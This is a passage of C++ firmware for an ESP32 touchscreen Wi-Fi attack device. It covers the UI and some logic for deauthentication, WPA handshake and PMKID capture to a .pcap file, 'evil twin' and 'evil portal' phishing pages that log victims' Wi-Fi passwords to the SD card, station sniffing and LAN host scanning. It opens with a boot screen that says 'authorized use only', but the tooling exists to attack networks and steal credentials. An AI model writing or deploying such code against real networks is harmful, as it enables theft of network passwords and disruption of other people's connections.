  char meta[40];
  snprintf(meta,sizeof(meta),"CH %u   LISTEN %s",ae::attackChannel(),attackElapsedText(ae::attackStartedMs()).c_str());
  drawTextFB(24,STAGE_Y+104,String(meta),GRAY,1,fb,34);
  if(!pmkid){
    const bool st[4]={hs&&hs->m1,hs&&hs->m2,hs&&hs->m3,hs&&hs->m4};
    const char* names[4]={"M1","M2","M3","M4"};
    for(int i=0;i<4;i++){
      int x=24+i*68;
      fillRoundRectFB(x,STAGE_Y+146,58,42,10,st[i]?mix565(BLACK,GREEN,70):surfaceColor(10),fb);
      drawTextCenteredInRect(x,STAGE_Y+146,58,42,names[i],st[i]?BLACK:WHITE,2,fb);
    }
    drawTextFB(24,STAGE_Y+206,"CAPTURE COMPLETE WHEN M1 + M2",GRAY,1,fb,32);
  }else{
    bool ok=hs&&hs->pmkidOK;
    fillRoundRectFB(24,STAGE_Y+146,180,42,10,ok?mix565(BLACK,GREEN,70):surfaceColor(10),fb);
    drawTextCenteredInRect(24,STAGE_Y+146,180,42,ok?"PMKID OK":"WAITING M1",ok?BLACK:WHITE,2,fb);
    drawTextFB(24,STAGE_Y+206,"ASSOC REQUESTS FORCE THE ROUTER",GRAY,1,fb,34);
    drawTextFB(24,STAGE_Y+222,"TO LEAK ITS PMKID IN EAPOL M1",GRAY,1,fb,34);
  }
  drawTextFB(24,STAGE_Y+256,String("EAPOL FRAMES SEEN: ")+String((unsigned long)pktEapol),WHITE,1,fb,26);
  if(hs&&(hs->complete||hs->pmkidOK)){
    fillRoundRectFB(24,STAGE_Y+286,272,38,10,mix565(BLACK,GREEN,60),fb);
    drawTextCenteredInRect(24,STAGE_Y+286,272,38,"CAPTURE OK - SAVING .PCAP",BLACK,1,fb);
  }else{
    fillRoundRectFB(24,STAGE_Y+286,272,38,10,surfaceColor(8),fb);
    drawTextCenteredInRect(24,STAGE_Y+286,272,38,"DEAUTH FORCES CLIENTS TO RECONNECT",GRAY,1,fb);
  }
}

// V25 FIND WIFI live panel: the hunted device, the state and every network
// candidate it has revealed so far. Tapping a row skips it ("next"), tapping
// its YES chip confirms it ("that's the wifi") and ends the search.
static void drawFindInfo(){
  if(!fb)return;
  stageClear();
  roundedCardFB(STAGE_X,STAGE_Y,STAGE_W,STAGE_H,14,DGRAY,BLACK,fb);
  drawTextFB(24,STAGE_Y+22,"FIND WIFI",CYAN,2,fb,18);
  drawTextFB(24,STAGE_Y+62,"HUNTED DEVICE",GRAY,1,fb,14);
  drawTextFB(24,STAGE_Y+78,macToString(ae::findStaMac()),WHITE,1,fb,36);
  int lock=ae::findLock();
  String state=lock>=0?String("LOCKED CH ")+String(ae::findNetAt((size_t)lock)?ae::findNetAt((size_t)lock)->channel:0)
                      :String("SCANNING ")+(ae::findBand24()?String("2.4 GHZ"):String("5 GHZ"));
  drawTextFB(24,STAGE_Y+100,state,lock>=0?GREEN:YELLOW,1,fb,36);
  const int y0=STAGE_Y+134,rowH=50;
  size_t shown=0;
  size_t n=ae::findCount();
  for(size_t i=0;i<n && shown<4;i++){
    const ae::FindNet *f=ae::findNetAt(i);
    if(!f||f->skipped) continue;
    int y=y0+(int)shown*rowH;
    bool isLock=(lock==(int)i);
    roundedCardFB(24,y,272,44,9,isLock?GREEN:DGRAY,isLock?mix565(BLACK,GREEN,45):surfaceColor(12),fb);
    String l1=String("CH ")+String(f->channel)+"  "+macToString(f->bssid);
    drawTextFB(32,y+5,l1,WHITE,1,fb,25);
    String nm=f->hasSsid?displaySSID(String(f->ssid),16):(f->hidden?String("(HIDDEN SSID)"):String("WAITING FOR NAME"));
    drawTextFB(32,y+21,nm,isLock?BLACK:CYAN,1,fb,20);
    String r=String((unsigned long)f->frames)+"F "+String(f->rssi)+"dBm";
    drawTextFB(186,y+21,r,isLock?BLACK:GRAY,1,fb,10);
    roundedCardFB(250,y+7,40,30,6,YELLOW,surfaceColor(22),fb);
    drawTextCenteredInRect(250,y+7,40,30,"YES",YELLOW,1,fb);
    shown++;
  }
  if(shown==0){
    drawTextFB(24,y0+10,"KICKING THE DEVICE...",GRAY,1,fb,26);
    drawTextFB(24,y0+28,"WAIT FOR IT TO REVEAL ITS NET",GRAY,1,fb,32);
  }
  fillRectFB(24,STAGE_Y+344,272,2,mix565(BLACK,WHITE,22),fb);
  drawTextFB(24,STAGE_Y+354,"TAP YES = THAT'S IT  TAP NET = NEXT",YELLOW,1,fb,36);
}

// NET SCAN results panel (information instead of animation).
static void drawLanScanInfo(){
  if(!fb)return;
  stageClear();
  roundedCardFB(STAGE_X,STAGE_Y,STAGE_W,STAGE_H,14,DGRAY,BLACK,fb);
  drawTextFB(24,STAGE_Y+24,"NET SCAN",CYAN,2,fb,12);
  drawTextFB(24,STAGE_Y+66,String("LOCAL IP: ")+WiFi.localIP().toString(),WHITE,1,fb,32);
  drawTextFB(24,STAGE_Y+86,"SCANNING SSDP + mDNS HOSTS",GRAY,1,fb,32);
  uint32_t el=millis()-lan::startedMs();
  int pct=lan::scanDone()?100:(int)constrain((long)el*100/4000L,0L,100L);
  fillRoundRectFB(24,STAGE_Y+118,272,14,7,surfaceColor(12),fb);
  fillRoundRectFB(24,STAGE_Y+118,(272*pct)/100,14,7,CYAN,fb);
  drawTextFB(24,STAGE_Y+150,String((unsigned)lan::hostCount())+" HOSTS FOUND",WHITE,2,fb,18);
  int y=STAGE_Y+192;
  size_t n=lan::hostCount();
  for(size_t i=0;i<n&&i<7;i++){
    const lan::LanHost *h=lan::hostAt(i);
    if(!h)break;
    drawTextFB(24,y,h->ip+":"+String(h->port),WHITE,1,fb,30);
    y+=20;
  }
  if(lan::scanDone()) drawTextFB(24,STAGE_Y+338,"SCAN DONE - BACK FOR THE HOST LIST",GREEN,1,fb,37);
}

// The stage dispatcher: terminal for the portal, info for capture/scan,
// Windows loader for everything else.
static void drawAttackStage(){
  if(!fb)return;
  if(etActive){ drawEtTerminal(); return; }
  if(ae::attackType()==ae::AttackType::FIND_WIFI){ drawFindInfo(); return; }
  if(ae::attackType()==ae::AttackType::HS_CAPTURE||ae::attackType()==ae::AttackType::PMKID_GRAB){
    drawHsInfo(); return;
  }
  if(lan::mode()==lan::Mode::NETSCAN && (lan::active()||lan::scanDone())){
    drawLanScanInfo(); return;
  }
  drawAttackSpinner(attackActionText());
}
// Evil portal live terminal: boot log + hits + captured passwords, and the
// credentials are stored on the SD card (/CAPTURED.TXT) automatically.
// After a verified password (V20) the header and status bar switch to a
// persistent SUCCESSFUL state so the password can be copied calmly.
static void drawEtTerminal(){
  if(!fb)return;
  stageClear();
  roundedCardFB(STAGE_X,STAGE_Y,STAGE_W,STAGE_H,14,etSuccess?GREEN:DGRAY,BLACK,fb);
  fillRectFB(STAGE_X+2,STAGE_Y+2,STAGE_W-4,26,etSuccess?mix565(BLACK,GREEN,40):surfaceColor(9),fb);
  String tt=etSuccess?String("SUCCESSFUL - PASSWORD VERIFIED"):
            (etFix?String("FIX WIFI TWIN - TERMINAL"):
             (etReplicate?String("MEGA TWIN + INTERNET - TERMINAL"):
              (etKeyPortal?String("KEYBOARD PORTAL - TERMINAL"):
               (etMega?String("MEGA EVIL PORTAL - TERMINAL"):String("EVIL PORTAL - TERMINAL")))));
  drawTextFB(STAGE_X+10,STAGE_Y+8,tt,etSuccess?BLACK:GREEN,1,fb,40);
  fillRectFB(STAGE_X+2,STAGE_Y+28,STAGE_W-4,2,etSuccess?GREEN:mix565(BLACK,GREEN,45),fb);
  int y=STAGE_Y+42;
  const int lineH=30;
  for(uint8_t i=0;i<etTermUsed;i++){
    uint8_t idx=(uint8_t)((etTermHead+ET_TERM_MAX-etTermUsed+i)%ET_TERM_MAX);
    drawTextFB(STAGE_X+10,y,">",mix565(BLACK,GREEN,55),1,fb,4);
    drawTextFB(STAGE_X+26,y,etTermLine[idx],etTermColor[idx],1,fb,46);
    y+=lineH;
  }
  if(!etSuccess && (millis()/400)%2==0 && y<STAGE_Y+STAGE_H-44)fillRectFB(STAGE_X+26,y+2,10,14,GREEN,fb);
  fillRectFB(STAGE_X+2,STAGE_Y+STAGE_H-32,STAGE_W-4,30,etSuccess?mix565(BLACK,GREEN,26):surfaceColor(8),fb);
  String st=etSuccess?String(etReplicate?"SUCCESSFUL - INTERNET LIVE":"SUCCESSFUL  -  BACK TO EXIT"):
            ("HITS "+String((unsigned long)etHits)+"   CREDS "+String((unsigned)etCreds)+"   "+attackElapsedText(etStartMs));
  drawTextFB(STAGE_X+10,STAGE_Y+STAGE_H-24,st,etSuccess?BLACK:WHITE,1,fb,STAGE_W-24);
  fillCircleFB(STAGE_X+STAGE_W-14,STAGE_Y+STAGE_H-17,4,(etSuccess||etCreds>0)?GREEN:DGRAY,fb);
}

// V20 template picker: built-in brand pages + every SD *.html, listed before
// any evil-family attack starts.
// V21 MEGA EVIL TWIN mode picker: replicate internet / live keyboard page /
// fix wifi page. Every mode clones the victim and deauths on its exact
// channel; the modes differ in the portal page and the verification flow.
static void drawMegaPick(){
  clearFB();header("MEGA EVIL TWIN");
  drawTextFB(16,53,"CHOOSE THE MEGA MODE",GRAY,1,fb,22);
  struct MRow{const char* t;const char* d1;const char* d2;uint16_t ac;};
  const MRow rows[3]={
    {"REPLICATE INTERNET","REAL PASSWORD = REAL INTERNET","NAT SHARES THE UPLINK",CYAN},
    {"LIVE KEYBOARD PAGE","TYPE YOUR OWN PORTAL TEXT","ON-SCREEN KEYBOARD",YELLOW},
    {"FIX WIFI PAGE","SMART DEAUTH + LIVE VERIFY","ONLY THE REAL PASS PASSES",GREEN}
  };
  for(int i=0;i<3;i++){
    int y=74+i*84;
    roundedCardFB(10,y,300,76,13,DGRAY,surfaceColor(16),fb);
    fillRoundRectFB(18,y+10,6,56,3,rows[i].ac,fb);
    drawTextFB(34,y+12,rows[i].t,rows[i].ac,1,fb,30);
    drawTextFB(34,y+32,rows[i].d1,WHITE,1,fb,34);
    drawTextFB(34,y+50,rows[i].d2,GRAY,1,fb,34);
    drawTextFB(289,y+30,">",rows[i].ac,1,fb,1);
  }
  drawCenteredFB(336,"PICK A MODE, THEN PICK THE VICTIM AP",GRAY,1,fb);
  drawCenteredFB(356,"DEAUTH ALWAYS HITS THE VICTIM BAND",GRAY,1,fb);
  footer();
}

static void drawPortalPick(){
  clearFB();header("PORTAL PAGE");
  drawTextFB(12,53,String((unsigned)etTmplCount)+" PAGES - BUILT-IN + SD HTML",GRAY,1,fb,38);
  const int top=70,rowH=44,maxRows=7;
  if(etTmplCount==0){drawCenteredFB(200,"NO TEMPLATES",YELLOW,1,fb);footer();return;}
  if(listTop+maxRows>etTmplCount && etTmplCount>maxRows)listTop=(uint8_t)(etTmplCount-maxRows);
  if(listTop+maxRows<=etTmplCount && etTmplCount<=maxRows)listTop=0;
  for(int r=0;r<maxRows;r++){
    size_t i=(size_t)listTop+r;if(i>=etTmplCount)break;
    int y=top+r*rowH;
    bool sel=((int)i==etTemplate);
    roundedCardFB(8,y,304,38,10,sel?GREEN:DGRAY,surfaceColor(13),fb);
    String nm=etTmplName[i];if(nm.length()>24)nm=nm.substring(0,23)+"..";
    drawTextFB(18,y+6,nm,sel?GREEN:WHITE,1,fb,30);
    drawTextFB(18,y+24,etTmplBuiltin[i]>=0?String("BUILT-IN"):String("SD CARD FILE"),GRAY,1,fb,18);
    if(sel)drawTextFB(282,y+13,"OK",GREEN,1,fb,2);
  }
  drawScrollbarV(top,top+maxRows*rowH,etTmplCount,maxRows,(int)listTop);
  drawCenteredFB(399,"TAP A PAGE TO START THE ATTACK",GRAY,1,fb);
  footer();
}

static String attackLiveTitle(){
  if(etActive) return etFix?String("FIX WIFI TWIN"):(etReplicate?String("MEGA TWIN: INTERNET"):(etKeyPortal?String("MEGA TWIN: KEYBOARD"):(etMega?String("MEGA EVIL TWIN"):String("EVIL TWIN"))));
  if(sBLECarrierActive) return sBLECarrierTitle;
  if(lan::active()) return lan::modeName(lan::mode());
  return ae::attackTitle();
}

static void drawAttackLive(){
  clearFB();
  header(attackLiveTitle());
  drawAttackStage();
  footer();
}

static void serviceAttackLive(){
  if(screen!=ATTACK_LIVE)return;
  // Refresh pacing: portal terminal 300 ms, info panels 250 ms, loader 110 ms.
  uint32_t period=etActive?300u:
    ((ae::attackType()==ae::AttackType::HS_CAPTURE||ae::attackType()==ae::AttackType::PMKID_GRAB||
      ae::attackType()==ae::AttackType::FIND_WIFI||
      (lan::mode()==lan::Mode::NETSCAN&&(lan::active()||lan::scanDone())))?250u:110u);
  uint32_t now=millis();
  bool activeAttack=etActive||ae::attackRunning()||ae::karmaActive()||sBLECarrierActive||lan::active()||lan::scanDone();
  if(now-attackLiveLastDrawMs>=period){
    if(activeAttack){
      attackLiveLastDrawMs=now;
      drawAttackStage();
      lcdPushRect(fb,STAGE_X,STAGE_Y,STAGE_W,STAGE_H);
    }
  }
  // IN-NET LAN attacks: NET SCAN auto-jumps to the host list when done.
  // The check requires no other engine active so a stale flag can never
  // hijack a different attack's live screen.
  if(lan::scanDone() && !ae::attackRunning() && !sBLECarrierActive){
    lan::clearScanDone();
    size_t n=lan::hostCount();
    transitionTo(LAN_HOSTS);
    showPopup("NET SCAN",String((unsigned)n)+" HOSTS FOUND","TAP A HOST TO TARGET",2200);
    return;
  }
  // Handshake / PMKID: flush EAPOL frames to SD (.pcap).
  if(ae::attackType()==ae::AttackType::HS_CAPTURE||ae::attackType()==ae::AttackType::PMKID_GRAB){
    ae::EapolRec rec;
    for(int k=0;k<3 && ae::hsRingPop(rec);k++){
      if(!sdMounted)break;
      File f=SD.open("/HS_EAPOL.PCAP","a");
      if(!f)break;
      if(!hsPcapHeaderWritten){
        const uint8_t GH[24]={0xD4,0xC3,0xB2,0xA1,0x02,0x00,0x04,0x00,0,0,0,0,0,0,0,0,0xFF,0xFF,0x00,0x00,105,0,0,0};
        f.write(GH,24);
        hsPcapHeaderWritten=true;
      }
      uint32_t ms=millis();
      uint32_t recH[4]={ms/1000UL,(ms%1000UL)*1000UL,(uint32_t)rec.len,(uint32_t)rec.len};
      f.write((uint8_t*)recH,16);
      f.write(rec.data,rec.len);
      f.close();
    }
  }
}

// ------------------------- Channel picker ---------------------------
static const uint8_t PICK_CHANNELS[]={
  1,2,3,4,5,6,7,8,9,10,11,12,13,
  36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,
  149,153,157,161,165,169,173,177
};
static constexpr uint8_t PICK_CHANNEL_COUNT=sizeof(PICK_CHANNELS)/sizeof(PICK_CHANNELS[0]);

static void drawChannelPicker(){
  clearFB();header("PICK CHANNEL");
  drawTextFB(16,53,"TAP A CHANNEL TO START THE ATTACK",GRAY,1,fb,33);
  for(uint8_t i=0;i<PICK_CHANNEL_COUNT;i++){
    uint8_t col=i%5, row=(uint8_t)(i/5);
    int x=12+col*60, y=68+row*40;
    bool is24=(PICK_CHANNELS[i]<=14);
    roundedCardFB(x,y,56,34,8,DGRAY,is24?surfaceColor(18):surfaceColor(12),fb);
    drawTextFB(x+8,y+5,String(PICK_CHANNELS[i]),is24?CYAN:YELLOW,1,fb,4);
    drawTextFB(x+8,y+19,is24?"2.4G":"5G",GRAY,1,fb,4);
  }
  drawCenteredFB(414,"GRID: 2.4 GHZ (CYAN) AND 5 GHZ (YELLOW)",GRAY,1,fb);
  footer();
}

// ------------------------- STA list / select -------------------------
static String macToString(const uint8_t* m){
  char buf[18];
  snprintf(buf,sizeof(buf),"%02X:%02X:%02X:%02X:%02X:%02X",m[0],m[1],m[2],m[3],m[4],m[5]);
  return String(buf);
}

static void drawSTAList(bool selectable){
  clearFB();header(selectable?"SELECT STAS":"STATION SCAN");
  size_t n=ae::staCount();
  bool confirmMode=selectable && staSelectConfirm;
  const int top=70,rowH=48,maxRows=confirmMode?6:7;
  drawTextFB(12,53,selectable?String("TAP A CLIENT TO TARGET  /  ")+String((unsigned)n)+" FOUND":String("LIVE SNIFFER  /  ")+String((unsigned)n)+" CLIENTS  /  CH "+String(ae::attackChannel()),GRAY,1,fb,34);
  if(!selectable){
    // V25: manual list clear - the scan no longer wipes entries on its own
    // ("van y desaparecen"), so the user gets an explicit CLEAR pill.
    drawPillFB(260,48,52,17,surfaceColor(10),DGRAY,fb);
    drawTextCenteredInRect(260,48,52,17,"CLEAR",YELLOW,1,fb);
  }
  if(n==0){
    drawCenteredFB(170,selectable?"NO STATIONS YET":"LISTENING FOR CLIENTS...",YELLOW,1,fb);
    drawCenteredFB(196,selectable?"RUN SCAN > SCAN STATIONS":"DATA FRAMES LINK DEVICES TO APS",GRAY,1,fb);
    footer();return;
  }
  if(listTop+maxRows>n && n>maxRows)listTop=(uint8_t)(n-maxRows);
  for(int r=0;r<maxRows;r++){
    size_t i=listTop+r;if(i>=n)break;
    ae::STAInfo *s=ae::staAt(i);if(!s)continue;
    int y=top+r*rowH;
    bool sel=selectable&&i<MAX_STA_SEL&&selectedSTA[i];
    roundedCardFB(8,y,304,42,10,sel?GREEN:DGRAY,sel?mix565(surfaceColor(15),GREEN,24):surfaceColor(13),fb);
    String apName="?";
    int apIdx=ae::findKnownAP(s->ap);
    if(apIdx>=0){ae::TargetAP *apv=ae::knownAPAt((size_t)apIdx);if(apv)apName=displaySSID(String(apv->ssid),14);}
    // V25: freshness at a glance - entries no longer vanish, so the age and
    // signal tell the user which clients are live right now.
    uint32_t ageS=(millis()-s->lastSeen)/1000UL;
    bool fresh=(ageS<45);
    uint16_t liveCol=fresh?GREEN:GRAY;
    drawTextFB(17,y+6,macToString(s->sta),fresh?WHITE:GRAY,1,fb,22);
    drawTextFB(17,y+25,"AP: "+apName,GRAY,1,fb,15);
    drawTextFB(148,y+25,String((unsigned long)s->pkts)+"F",liveCol,1,fb,5);
    drawTextFB(200,y+25,String(s->rssi)+"dBm",liveCol,1,fb,7);
    drawTextFB(262,y+25,ageS<60?String(ageS)+"s":String(ageS/60)+"m",liveCol,1,fb,5);
    if(selectable){roundedCardFB(286,y+7,14,14,4,sel?GREEN:GRAY,sel?GREEN:surfaceColor(10),fb);if(sel)drawTextFB(289,y+8,"+",BLACK,1,fb,1);}
  }
  drawScrollbarV(top,top+maxRows*rowH,n,maxRows,(int)listTop);
  footer();
}

// ------------------------- Boot disclaimer ---------------------------
static void drawDiscl(){
  clearFB();
  drawCenteredFB(70,"AUTHORIZED USE ONLY",RED,2,fb);
  roundedCardFB(14,110,292,240,15,DGRAY,surfaceColor(13),fb);
  const char *lines[]={
    "THIS FIRMWARE TRANSMITS REAL",
    "WI-FI AND BLE ATTACK FRAMES.",
    "",
    "USE IT ONLY ON NETWORKS YOU",
    "OWN OR ARE AUTHORIZED IN",
    "WRITING TO TEST.",
    "",
    "UNAUTHORIZED JAMMING OR",
    "SPOOFING IS A CRIME IN MOST",
    "COUNTRIES (CFAA / FCC / EU).",
    "",
    "SALARINI X V16 + NOVA X CORE"
  };
  for(int i=0;i<12;i++) drawCenteredFB(126+i*18,lines[i],(i==0||i==11)?WHITE:GRAY,1,fb);
  roundedCardFB(60,368,200,42,12,CYAN,mix565(surfaceColor(15),CYAN,20),fb);
  drawCenteredFB(382,"TAP TO ACCEPT + CONTINUE",WHITE,1,fb);
  drawTextFB(0,440,"",GRAY,1,fb,1);
}

static void drawUnavailable(const String &title,const String &line1,const String &line2){
  clearFB(); header(title); frameRectFB(20,124,280,164,CYAN,fb);
  drawCenteredFB(158,line1,WHITE,2,fb);
  drawCenteredFB(202,line2,YELLOW,1,fb);
  drawCenteredFB(250,"AUTO CLOSE",GRAY,1,fb);
}


// ------------------------- microSD card -----------------------------
static bool sdMountCard(){
  if(sdMounted)return true;
  sdMountAttempted=true;
  // LCD and SD share SPI clock/data wires; keep LCD deselected while mounting.
  digitalWrite(LCD_CS,HIGH); pinMode(SD_CS,OUTPUT); digitalWrite(SD_CS,HIGH);
  sdMounted=SD.begin(SD_CS,lcdSPI,12000000,"/sd",8,false);
  if(sdMounted){
    uint64_t sz=SD.cardSize();
    Serial.printf("[SD] mounted, capacity %.1f MB\n",(double)sz/1048576.0);
  }else Serial.println("[SD] mount failed: check card format (FAT32) and seating");
  digitalWrite(LCD_CS,HIGH);
  return sdMounted;
}
static void sdRefreshFiles(){
  sdFileCount=0;
  if(!sdMountCard())return;
  digitalWrite(LCD_CS,HIGH);
  File root=SD.open(sdCurDir.c_str());
  if(!root)return;
  // Parent entry first so the user can climb back up.
  if(sdCurDir!="/" && sdFileCount<SD_MAX_FILES){
    sdFilePaths[sdFileCount]="/";
    sdFileNames[sdFileCount]="..";
    sdFileDirs[sdFileCount]=true;
    sdFileSizes[sdFileCount]=0;
    sdFileCount++;
  }
  // Two passes: directories first, then files (real file-manager order).
  for(int pass=0;pass<2;pass++){
    File entry=root.openNextFile();
    while(entry && sdFileCount<SD_MAX_FILES){
      String raw=String(entry.name());
      bool isDir=entry.isDirectory();
      uint64_t sz=entry.size();
      entry.close();
      entry=root.openNextFile();
      if(raw.length()==0 || raw=="." || raw=="..")continue;
      bool want=(pass==0)?isDir:(!isDir);
      if(!want)continue;
      String name=raw.startsWith("/")?raw.substring(raw.lastIndexOf('/')+1):raw;
      String full=raw.startsWith("/")?raw:(sdCurDir.endsWith("/")?sdCurDir+raw:sdCurDir+"/"+raw);
      sdFilePaths[sdFileCount]=full;
      sdFileNames[sdFileCount]=name;
      sdFileDirs[sdFileCount]=isDir;
      sdFileSizes[sdFileCount]=(uint32_t)min((uint64_t)0xFFFFFFFFULL,sz);
      sdFileCount++;
    }
  }
  root.close();digitalWrite(LCD_CS,HIGH);
  if(sdListTop>=sdFileCount)sdListTop=sdFileCount>6?sdFileCount-6:0;
}
static bool sdWriteStatusLog(){
  if(!sdMountCard())return false;
  digitalWrite(LCD_CS,HIGH);
  SD.remove("/salarini_status.txt");
  File f=SD.open("/salarini_status.txt",FILE_WRITE);
  if(!f){digitalWrite(LCD_CS,HIGH);return false;}
  f.println("SALARINI C5 Touch status");
  f.println("-----------------------");
  f.print("Uptime seconds: ");f.println(millis()/1000UL);
  f.print("Battery present: ");f.println(batPresent?"yes":"no");
  f.print("Battery percent: ");if(batPercent>=0)f.print(batPercent);else f.print("unknown");f.println("%");
  f.print("Battery mV: ");f.println(batMv);
  f.print("Charging: ");f.println(batCharging?"yes":"no");
  f.print("USB/VBUS mV: ");f.println(vbusMv);
  f.print("WiFi status: ");f.println(WiFi.status()==WL_CONNECTED?"connected":"disconnected");
  if(WiFi.status()==WL_CONNECTED){f.print("SSID: ");f.println(WiFi.SSID());f.print("IP: ");f.println(WiFi.localIP().toString());}
  f.print("Flash MB: ");f.println((unsigned long)(ESP.getFlashChipSize()/1024/1024));
  f.print("PSRAM MB: ");f.println((unsigned long)(ESP.getPsramSize()/1024/1024));
  f.close();digitalWrite(LCD_CS,HIGH);return true;
}
static bool sdLoadTextFile(const String &path){
  if(!sdMountCard())return false;
  digitalWrite(LCD_CS,HIGH);
  File f=SD.open(path.c_str(),FILE_READ);
  if(!f || f.isDirectory()){if(f)f.close();digitalWrite(LCD_CS,HIGH);return false;}
  sdViewTitle=path;sdViewText="";
  size_t n=0;
  while(f.available() && n<1000){
    int c=f.read();if(c<0)break;
    if(c=='\r')continue;
    if((c>=32 && c<=126) || c=='\n' || c=='\t')sdViewText+=(char)c;
    else sdViewText+='.';
    n++;
  }
  f.close();digitalWrite(LCD_CS,HIGH);return true;
}
static void drawSDPage(){
  clearFB();header("SD STORAGE");
  roundedCardFB(10,57,300,67,14,DGRAY,surfaceColor(17),fb);
  drawTextFB(23,72,sdMounted?"MICRO SD READY":"MICRO SD NOT MOUNTED",sdMounted?GREEN:YELLOW,1,fb,25);
  String info=sdMounted?String((unsigned long)(SD.cardSize()/1048576ULL))+" MB CARD / "+String((unsigned)sdFileCount)+" FILES":"INSERT FAT32 CARD THEN MOUNT";
  drawTextFB(23,94,info,GRAY,1,fb,34);
  const char *labels[]={"MOUNT / REFRESH","BROWSE FILES","WRITE STATUS LOG","SAFE EJECT"};
  const char *subs[]={"INITIALIZE CARD","OPEN ROOT DIRECTORY","SAVE BATTERY + WIFI INFO","UNMOUNT SAFELY"};
  for(int i=0;i<4;i++){
    int y=135+i*64;
    roundedCardFB(12,y,296,54,13,DGRAY,surfaceColor(17),fb);
    fillRoundRectFB(21,y+11,31,31,9,mix565(BLACK,CYAN,24),fb);
    if(i==0){drawCircleFB(36,y+26,7,CYAN,fb);drawCircleFB(36,y+26,3,WHITE,fb);}
    else if(i==1){drawLineFB(28,y+19,43,y+19,CYAN,fb);drawLineFB(28,y+26,43,y+26,CYAN,fb);drawLineFB(28,y+33,40,y+33,CYAN,fb);}
    else if(i==2){drawLineFB(28,y+18,44,y+18,CYAN,fb);drawLineFB(28,y+18,28,y+35,CYAN,fb);drawLineFB(28,y+35,44,y+35,CYAN,fb);drawLineFB(44,y+18,44,y+35,CYAN,fb);}
    else {drawCircleFB(36,y+26,7,YELLOW,fb);drawLineFB(31,y+26,41,y+26,YELLOW,fb);}
    drawTextFB(62,y+11,labels[i],WHITE,1,fb,22);
    drawTextFB(62,y+29,subs[i],GRAY,1,fb,26);
    drawTextFB(285,y+20,">",CYAN,1,fb,1);
  }
  footer();
}
static void drawSDFiles(){
  clearFB();header("FILE MANAGER");
  String dirLine=String(sdFileCount)+" ITEMS  /  "+sdCurDir;
  if(dirLine.length()>30)dirLine=dirLine.substring(0,30);
  drawTextFB(18,53,dirLine,GRAY,1,fb,37);
  if(!sdMounted){drawCenteredFB(180,"NO CARD MOUNTED",YELLOW,1,fb);drawCenteredFB(204,"GO BACK AND MOUNT IT",GRAY,1,fb);footer();return;}
  const size_t rows=6;
  drawScrollbarV(76,394,sdFileCount,(int)rows,(int)sdListTop);
  for(size_t r=0;r<rows;r++){
    size_t i=sdListTop+r;if(i>=sdFileCount)break;
    int y=76+(int)r*53;
    roundedCardFB(10,y,300,46,11,DGRAY,surfaceColor(15),fb);
    fillRoundRectFB(18,y+10,27,27,7,sdFileDirs[i]?mix565(BLACK,YELLOW,20):mix565(BLACK,CYAN,20),fb);
    drawTextFB(26,y+18,sdFileDirs[i]?"D":"F",sdFileDirs[i]?YELLOW:CYAN,1,fb,1);
    String name=sdFileNames[i];if(name.length()>25)name="..."+name.substring(name.length()-22);
    drawTextFB(54,y+8,name,WHITE,1,fb,27);
    String meta=sdFileDirs[i]?"DIRECTORY":String((unsigned long)sdFileSizes[i])+" BYTES";
    drawTextFB(54,y+26,meta,GRAY,1,fb,23);
    drawTextFB(285,y+17,">",CYAN,1,fb,1);
  }
  drawCenteredFB(399,"TAP A FOLDER TO OPEN / FILE TO VIEW",GRAY,1,fb);
  footer();
}
static void drawSDViewer(){
  clearFB();header("FILE VIEWER");
  roundedCardFB(10,55,300,334,14,DGRAY,surfaceColor(12),fb);
  drawTextFB(20,66,sdViewTitle, CYAN,1,fb,33);
  int y=88;String line="";int lines=0;
  for(size_t i=0;i<sdViewText.length() && lines<22;i++){
    char c=sdViewText[i];
    if(c=='\n' || line.length()>=31){drawTextFB(20,y,line,WHITE,1,fb,32);y+=14;line="";lines++;if(c=='\n')continue;}
    if(c!='\n')line+=c;
  }
  if(line.length() && lines<22)drawTextFB(20,y,line,WHITE,1,fb,32);
  // V20 file administration: delete the file being viewed.
  fillRoundRectFB(78,396,164,28,9,RED,fb);
  drawTextCenteredInRect(78,396,164,28,"DELETE FILE",WHITE,1,fb);
  footer();
}

// ---------------------------- Speaker --------------------------------
static bool esWrite(uint8_t reg,uint8_t value){
  Wire.beginTransmission(ES8311_ADDR);Wire.write(reg);Wire.write(value);return Wire.endTransmission()==0;
}
static bool esRead(uint8_t reg,uint8_t &value){
  Wire.beginTransmission(ES8311_ADDR);Wire.write(reg);if(Wire.endTransmission(false)!=0)return false;
  if(Wire.requestFrom(ES8311_ADDR,(uint8_t)1)!=1)return false;value=Wire.read();return true;
}
static bool es8311Configure(){
  // Exact I2C + register order for an ES8311 in slave mode with no MCLK pin.
  Wire.beginTransmission(ES8311_ADDR);if(Wire.endTransmission()!=0)return false;
  bool ok=true;
  ok &= esWrite(0x44,0x08);ok &= esWrite(0x44,0x08); // I2C noise immunity
  ok &= esWrite(0x01,0x30);ok &= esWrite(0x02,0x00);ok &= esWrite(0x03,0x10);
  ok &= esWrite(0x16,0x24);ok &= esWrite(0x04,0x10);ok &= esWrite(0x05,0x00);
  ok &= esWrite(0x0B,0x00);ok &= esWrite(0x0C,0x00);
  ok &= esWrite(0x10,0x1F);ok &= esWrite(0x11,0x7F);
  ok &= esWrite(0x00,0x80);delay(5); // reset released, codec power on
  uint8_t reg00=0x80;
  if(esRead(0x00,reg00)){reg00&=(uint8_t)~0x40;ok &= esWrite(0x00,reg00);}else ok=false; // slave mode
  ok &= esWrite(0x01,0xBF); // internal clock path; no physical MCLK on this board
  uint8_t reg06=0;
  if(esRead(0x06,reg06)){reg06&=(uint8_t)~0x20;reg06=(uint8_t)((reg06&0xE0)|0x03);ok &= esWrite(0x06,reg06);}else ok=false;
  ok &= esWrite(0x07,0x00);ok &= esWrite(0x08,0xFF); // 48 kHz LRCK divider
  ok &= esWrite(0x13,0x10);ok &= esWrite(0x1B,0x0A);ok &= esWrite(0x1C,0x6A);
  ok &= esWrite(0x44,0x08);
  uint8_t r09=0,r0a=0;
  if(esRead(0x09,r09)){r09=(uint8_t)((r09&0xBF)|0x0C);ok &= esWrite(0x09,r09);}else ok=false;
  if(esRead(0x0A,r0a)){r0a=(uint8_t)((r0a&0xBF)|0x0C);ok &= esWrite(0x0A,r0a);}else ok=false;
  ok &= esWrite(0x17,0xBF);ok &= esWrite(0x0E,0x02);ok &= esWrite(0x12,0x00);
  ok &= esWrite(0x14,0x1A);ok &= esWrite(0x0D,0x01);ok &= esWrite(0x15,0x40);
  ok &= esWrite(0x37,0x08);ok &= esWrite(0x45,0x00);
  uint8_t muteReg=0;
